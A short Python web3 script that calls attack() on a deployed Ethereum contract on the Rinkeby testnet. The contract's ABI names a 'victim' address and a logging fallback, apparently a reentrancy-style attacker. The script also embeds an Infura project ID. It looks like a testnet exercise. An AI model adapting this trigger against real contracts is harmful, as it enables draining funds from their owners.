from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware
import time

#配置
abi = '[{"constant":true,"inputs":[],"name":"count","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"store_eth","outputs":[{"name":"","type":"uint256"}],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"attack","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"victim","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":false,"name":"c","type":"uint256"},{"indexed":false,"name":"balance","type":"uint256"}],"name":"LogFallback","type":"event"}]'
contract_address = '0x29C1c6b7052036e3FF2cfd1B3a4c93CC21EcCa42'
infura_path = "https://rinkeby.infura.io/v3/a37a634302af4836b0a1b26fdf39c6f5"


# w3=Web3(Web3.IPCProvider("~/.ethereum/geth.ipc"))
w3 = Web3(Web3.HTTPProvider(infura_path))
w3.middleware_stack.inject(geth_poa_middleware, layer=0)  #use ipc
w3.isConnected(),'connect fail 请打开geth'

#eth_rinekby
key = ''

from_address =w3.toChecksumAddress("")


nonce = w3.eth.getTransactionCount(from_address) 
contract = w3.eth.contract(address=contract_address, abi=abi)
transaction =  contract.functions.attack().buildTransaction({
                'nonce': nonce,
                'from':from_address,
                'gas':140000,#火币使用的，56000一般就够了
                'gasPrice':5000000000,
        })

signed = w3.eth.account.signTransaction(transaction,key)


#When you run sendRawTransaction, you get back the hash of the transaction:
transactionHash=w3.eth.sendRawTransaction(signed.rawTransaction)  
# watingMined(transactionHash)
print(transactionHash)
print("waiting for mined")
transaction=w3.eth.waitForTransactionReceipt(transactionHash, timeout=120)
print("打包成功")
print(transaction)